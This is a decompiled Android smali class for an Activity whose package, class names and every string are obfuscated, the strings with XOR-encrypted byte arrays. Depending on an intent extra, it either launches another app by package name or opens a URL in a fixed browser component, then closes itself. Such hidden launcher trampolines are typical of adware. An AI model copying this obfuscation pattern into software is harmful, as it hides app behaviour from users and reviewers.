.class public Lcom/vknnolqo/p9sv5zvf/X9mxyQZH;
.super Landroid/app/Activity;
.source "SourceFile"


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private a(Ljava/lang/String;)V
    .locals 3

    .line 1
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    if-eqz v0, :cond_0

    const/high16 p1, 0x10000000

    invoke-virtual {v0, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :cond_0
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v2, 0xf

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :goto_0
    return-void

    :array_0
    .array-data 1
        -0x68t
        -0x42t
        0x7et
        -0x2at
        -0x6ct
        -0x38t
        -0x46t
        -0x1at
        -0x65t
        -0x51t
        0x65t
        -0x25t
        -0x7ft
        -0x40t
        -0x43t
        -0x15t
    .end array-data

    :array_1
    .array-data 1
        -0x26t
        -0x34t
        0x11t
        -0x4et
        -0x9t
        -0x57t
        -0x37t
        -0x6et
    .end array-data

    :array_2
    .array-data 1
        0x59t
        -0x4bt
        -0x47t
        -0x33t
        0x1ft
        0x1at
        0x7ft
        0x51t
        0x7et
        -0x56t
        -0x44t
        -0x7dt
        0x15t
        0x4ft
        0x2bt
    .end array-data

    :array_3
    .array-data 1
        0x18t
        -0x3bt
        -0x37t
        -0x13t
        0x71t
        0x75t
        0xbt
        0x71t
    .end array-data
.end method

.method private b(Ljava/lang/String;)V
    .locals 7

    .line 1
    const/16 v0, 0x1a

    const/16 v1, 0x8

    :try_start_0
    new-instance v2, Landroid/content/Intent;

    new-array v3, v0, [B

    fill-array-data v3, :array_0

    new-array v4, v1, [B

    fill-array-data v4, :array_1

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v3, Landroid/content/ComponentName;

    const/16 v4, 0x12

    new-array v4, v4, [B

    fill-array-data v4, :array_2

    new-array v5, v1, [B

    fill-array-data v5, :array_3

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0x23

    new-array v5, v5, [B

    fill-array-data v5, :array_4

    new-array v6, v1, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v2, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    const/16 v3, 0x20

    new-array v3, v3, [B

    fill-array-data v3, :array_6

    new-array v4, v1, [B

    fill-array-data v4, :array_7

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    invoke-virtual {p0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    new-instance v2, Landroid/content/Intent;

    new-array v0, v0, [B

    fill-array-data v0, :array_8

    new-array v1, v1, [B

    fill-array-data v1, :array_9

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    invoke-direct {v2, v0, p1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    invoke-virtual {v2, p1}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object p1

    if-eqz p1, :cond_0

    const/high16 p1, 0x10000000

    invoke-virtual {v2, p1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_0
    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        -0x68t
        0x71t
        0x30t
        -0x57t
        -0x40t
        -0x4at
        0x5t
        -0x76t
        -0x70t
        0x71t
        0x20t
        -0x42t
        -0x3ft
        -0x55t
        0x4ft
        -0x3bt
        -0x66t
        0x6bt
        0x3dt
        -0x4ct
        -0x3ft
        -0xft
        0x2ct
        -0x1bt
        -0x50t
        0x51t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x7t
        0x1ft
        0x54t
        -0x25t
        -0x51t
        -0x21t
        0x61t
        -0x5ct
    .end array-data

    :array_2
    .array-data 1
        0x21t
        0x1t
        -0x37t
        -0x6ft
        0x7bt
        -0x32t
        0xdt
        0x38t
        0x2dt
        0x7t
        -0x40t
        -0x6ft
        0x79t
        -0x38t
        0x1bt
        0x25t
        0x2ft
        0xbt
    .end array-data

    nop

    :array_3
    .array-data 1
        0x42t
        0x6et
        -0x5ct
        -0x41t
        0x1at
        -0x60t
        0x69t
        0x4at
    .end array-data

    :array_4
    .array-data 1
        0x65t
        0x53t
        0x2bt
        0x31t
        0x44t
        -0x6bt
        -0x53t
        0x5et
        0x6at
        0x59t
        0x68t
        0x7et
        0x4dt
        -0x62t
        -0x50t
        0x56t
        0x6ft
        0x58t
        0x68t
        0x7et
        0x53t
        -0x76t
        -0x4ft
        0x17t
        0x65t
        0x54t
        0x34t
        0x70t
        0x4et
        -0x61t
        -0x14t
        0x74t
        0x67t
        0x55t
        0x28t
    .end array-data

    :array_5
    .array-data 1
        0x6t
        0x3ct
        0x46t
        0x1ft
        0x23t
        -0x6t
        -0x3et
        0x39t
    .end array-data

    :array_6
    .array-data 1
        -0x3ct
        0x43t
        0x40t
        0x76t
        -0xet
        0x27t
        0x14t
        -0x64t
        -0x34t
        0x43t
        0x50t
        0x61t
        -0xdt
        0x3at
        0x5et
        -0x2ft
        -0x3ct
        0x59t
        0x41t
        0x63t
        -0xet
        0x3ct
        0x9t
        -0x64t
        -0x17t
        0x6ct
        0x71t
        0x4at
        -0x22t
        0x6t
        0x35t
        -0x20t
    .end array-data

    :array_7
    .array-data 1
        -0x5bt
        0x2dt
        0x24t
        0x4t
        -0x63t
        0x4et
        0x70t
        -0x4et
    .end array-data

    :array_8
    .array-data 1
        -0x1ct
        0x52t
        -0x54t
        -0x2at
        -0x38t
        0xat
        0x7bt
        -0x73t
        -0x14t
        0x52t
        -0x44t
        -0x3ft
        -0x37t
        0x17t
        0x31t
        -0x3et
        -0x1at
        0x48t
        -0x5ft
        -0x35t
        -0x37t
        0x4dt
        0x49t
        -0x16t
        -0x40t
        0x6bt
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x7bt
        0x3ct
        -0x38t
        -0x5ct
        -0x59t
        0x63t
        0x1ft
        -0x5dt
    .end array-data
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 7

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x4

    const/16 v0, 0x8

    const/4 v1, 0x0

    :try_start_0
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v2

    new-array v3, p1, [B

    fill-array-data v3, :array_0

    new-array v4, v0, [B

    fill-array-data v4, :array_1

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    new-array v3, p1, [B

    fill-array-data v3, :array_2

    new-array v4, v0, [B

    fill-array-data v4, :array_3

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    goto :goto_0

    :catch_0
    move-exception v2

    goto :goto_1

    :cond_0
    move-object v3, v1

    :goto_0
    const/4 v4, 0x7

    new-array v5, v4, [B

    fill-array-data v5, :array_4

    new-array v6, v0, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_1

    new-array v4, v4, [B

    fill-array-data v4, :array_6

    new-array v5, v0, [B

    fill-array-data v5, :array_7

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    move-object v2, v1

    move-object v1, v3

    goto :goto_2

    :goto_1
    invoke-virtual {v2}, Ljava/lang/Throwable;->printStackTrace()V

    move-object v2, v1

    :goto_2
    if-eqz v1, :cond_7

    if-eqz v2, :cond_7

    const/16 v3, 0x10

    new-array v4, v3, [B

    fill-array-data v4, :array_8

    new-array v5, v0, [B

    fill-array-data v5, :array_9

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v5, 0xb

    new-array v5, v5, [B

    fill-array-data v5, :array_a

    new-array v6, v0, [B

    fill-array-data v6, :array_b

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v4, v3, [B

    fill-array-data v4, :array_c

    new-array v5, v0, [B

    fill-array-data v5, :array_d

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v5, 0x9

    new-array v5, v5, [B

    fill-array-data v5, :array_e

    new-array v6, v0, [B

    fill-array-data v6, :array_f

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v4, 0x1

    invoke-virtual {p0, v4}, Landroid/app/Activity;->requestWindowFeature(I)Z

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v5

    const/16 v6, 0x400

    invoke-virtual {v5, v6, v6}, Landroid/view/Window;->setFlags(II)V

    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    const v6, 0x17a21

    if-eq v5, v6, :cond_3

    const v6, 0x32affa

    if-eq v5, v6, :cond_2

    goto :goto_3

    :cond_2
    new-array p1, p1, [B

    fill-array-data p1, :array_10

    new-array v5, v0, [B

    fill-array-data v5, :array_11

    invoke-static {p1, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    move p1, v4

    goto :goto_4

    :cond_3
    const/4 p1, 0x3

    new-array p1, p1, [B

    fill-array-data p1, :array_12

    new-array v5, v0, [B

    fill-array-data v5, :array_13

    invoke-static {p1, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    const/4 p1, 0x0

    goto :goto_4

    :cond_4
    :goto_3
    const/4 p1, -0x1

    :goto_4
    if-eqz p1, :cond_6

    if-eq p1, v4, :cond_5

    new-array p1, v3, [B

    fill-array-data p1, :array_14

    new-array v2, v0, [B

    fill-array-data v2, :array_15

    invoke-static {p1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v2, 0x13

    new-array v2, v2, [B

    fill-array-data v2, :array_16

    new-array v0, v0, [B

    fill-array-data v0, :array_17

    invoke-static {v2, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_5

    :cond_5
    invoke-direct {p0, v2}, Lcom/vknnolqo/p9sv5zvf/X9mxyQZH;->b(Ljava/lang/String;)V

    goto :goto_5

    :cond_6
    invoke-direct {p0, v2}, Lcom/vknnolqo/p9sv5zvf/X9mxyQZH;->a(Ljava/lang/String;)V

    :cond_7
    :goto_5
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    nop

    :array_0
    .array-data 1
        0x47t
        0x50t
        0xdt
        -0x3bt
    .end array-data

    :array_1
    .array-data 1
        0x33t
        0x29t
        0x7dt
        -0x60t
        0x4dt
        0x76t
        -0x6ct
        -0x55t
    .end array-data

    :array_2
    .array-data 1
        0x41t
        0x70t
        0x6ct
        0x3ft
    .end array-data

    :array_3
    .array-data 1
        0x35t
        0x9t
        0x1ct
        0x5at
        0x62t
        0x40t
        -0x17t
        0x6et
    .end array-data

    :array_4
    .array-data 1
        -0x65t
        0x68t
        -0x48t
        -0x2t
        -0x2ft
        0x67t
        0x6ft
    .end array-data

    :array_5
    .array-data 1
        -0x11t
        0x7t
        -0x2ct
        -0x75t
        -0x41t
        0x4t
        0x7t
        0x4t
    .end array-data

    :array_6
    .array-data 1
        -0x17t
        0x4t
        -0x16t
        -0x48t
        -0x1et
        0x11t
        0x35t
    .end array-data

    :array_7
    .array-data 1
        -0x63t
        0x6bt
        -0x7at
        -0x33t
        -0x74t
        0x72t
        0x5dt
        0xat
    .end array-data

    :array_8
    .array-data 1
        -0x28t
        0x67t
        -0x22t
        -0x53t
        -0x49t
        0x58t
        -0x2dt
        0x2bt
        -0x25t
        0x76t
        -0x3bt
        -0x60t
        -0x5et
        0x50t
        -0x2ct
        0x26t
    .end array-data

    :array_9
    .array-data 1
        -0x66t
        0x15t
        -0x4ft
        -0x37t
        -0x2ct
        0x39t
        -0x60t
        0x5ft
    .end array-data

    :array_a
    .array-data 1
        0x7at
        0x33t
        0x34t
        -0x22t
        0x46t
        -0x58t
        -0x5at
        0x76t
        0x73t
        0x7ct
        0x7at
    .end array-data

    :array_b
    .array-data 1
        0x16t
        0x46t
        0x5at
        -0x43t
        0x2et
        -0x24t
        -0x21t
        0x6t
    .end array-data

    :array_c
    .array-data 1
        0x2ft
        -0x4ct
        -0x22t
        0x1dt
        -0x7dt
        0x12t
        -0x7ft
        -0x26t
        0x2ct
        -0x5bt
        -0x3bt
        0x10t
        -0x6at
        0x1at
        -0x7at
        -0x29t
    .end array-data

    :array_d
    .array-data 1
        0x6dt
        -0x3at
        -0x4ft
        0x79t
        -0x20t
        0x73t
        -0xet
        -0x52t
    .end array-data

    :array_e
    .array-data 1
        -0x21t
        0x9t
        0x5dt
        -0x21t
        0x4dt
        0x7et
        0x77t
        0x42t
        -0x75t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x55t
        0x66t
        0x31t
        -0x56t
        0x23t
        0x1dt
        0x1ft
        0x78t
    .end array-data

    :array_10
    .array-data 1
        -0x9t
        -0x46t
        0x71t
        -0x37t
    .end array-data

    :array_11
    .array-data 1
        -0x65t
        -0x2dt
        0x1ft
        -0x5et
        -0x12t
        0x3at
        -0x7ct
        -0x30t
    .end array-data

    :array_12
    .array-data 1
        -0x25t
        0x67t
        0x23t
    .end array-data

    :array_13
    .array-data 1
        -0x46t
        0x17t
        0x53t
        -0x58t
        -0xft
        -0x21t
        -0x6t
        0x47t
    .end array-data

    :array_14
    .array-data 1
        0x62t
        -0x5t
        0x11t
        -0x28t
        -0x55t
        -0x41t
        -0x48t
        -0x8t
        0x61t
        -0x16t
        0xat
        -0x2bt
        -0x42t
        -0x49t
        -0x41t
        -0xbt
    .end array-data

    :array_15
    .array-data 1
        0x20t
        -0x77t
        0x7et
        -0x44t
        -0x38t
        -0x22t
        -0x35t
        -0x74t
    .end array-data

    :array_16
    .array-data 1
        -0x4et
        -0x53t
        0xbt
        0x2ct
        -0x9t
        0x7t
        0x36t
        0x4dt
        -0x75t
        -0x4at
        0xet
        0x21t
        -0x10t
        0x4t
        0x21t
        0x1dt
        -0x7et
        -0x7t
        0x40t
    .end array-data

    :array_17
    .array-data 1
        -0x19t
        -0x3dt
        0x60t
        0x42t
        -0x68t
        0x70t
        0x58t
        0x6dt
    .end array-data
.end method

.method protected onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method
